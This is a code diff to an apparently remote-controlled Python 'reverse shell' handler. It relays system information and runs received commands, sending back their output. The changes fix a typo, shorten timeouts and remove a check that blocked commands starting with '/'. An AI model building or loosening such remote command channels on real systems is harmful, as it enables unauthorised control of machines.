@@ -33,7 +33,7 @@ def shell(request: Request) -> str:
     sleep_time = 2
     exit_code = "TIME_OUT"
 
-    engine.send(f"start reverse shell\nfor EXIT send `exit`", request.sytsem_data)
+    engine.send(f"start reverse shell\nfor EXIT send `exit`", request.system_info())
 
     while repeat < time_out:
 
@@ -51,7 +51,7 @@ def shell(request: Request) -> str:
             break
 
         else:
-            res = _cmd(command, engine, timeout=10)
+            res = _cmd(command, engine, timeout=4)
             if res != None:
                 engine.send(res)
             engine.send(f"{os.getcwd()}=>")
@@ -64,9 +64,6 @@ def _valid_command(command) -> bool:
         return False
 
     if len(command) < 1:
-        return False
-
-    if command[0].startswith("/"):
         return False
 
     return True
@@ -103,7 +100,7 @@ def _cd(command: list[str]) -> str:
         return error
 
 
-def _cmd(command: list[str], engine, timeout: int = 10):
+def _cmd(command: list[str], engine, timeout: int = 4):
     """Run commands."""
 
     if command[0] in ("ls", "dir"):
@@ -120,7 +117,7 @@ def _cmd(command: list[str], engine, timeout: int = 10):
         tread = threading.Thread(target=_runcommand_in_thread, args=[command, engine])
         tread.start()
 
-        for i in range(timeout):
+        for _ in range(timeout):
             if tread.is_alive():
                 time.sleep(1)
                 continue
